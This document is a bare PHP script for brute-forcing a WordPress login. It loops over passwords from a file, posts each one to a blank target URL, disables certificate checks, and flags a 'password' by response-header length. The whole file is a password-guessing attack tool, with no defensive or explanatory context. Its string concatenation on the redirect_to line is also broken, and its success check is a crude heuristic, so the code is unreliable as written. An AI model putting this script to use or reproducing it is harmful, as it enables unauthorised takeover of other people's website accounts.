<?php
  $url = '';//wp-login.
  $user = '';//wp-user
  $rurl = '';//redirect wp-url, example 'http://xxxx.xxx/wp-admin'
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_HEADER, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $file = fopen("pass.txt", "r");
  while($line = fgets($file)) {
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'log='.$user.'&pwd='.$line.'&wp-submit=%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3&redirect_to='$rurl'&testcookie=1');
    $res1 = curl_exec($ch);
    $res2 = curl_getinfo($ch);
    echo $line;
    if(CURLE_OK !== curl_errno($ch)) {
      echo 'request time out'."\n";
      break;
    }
    if(strlen(substr($res1, 0, $res2['header_size']))>396) {
      echo ' this is password'."\n";
      break;
    }
  }
  curl_close($ch);
  fclose($file);
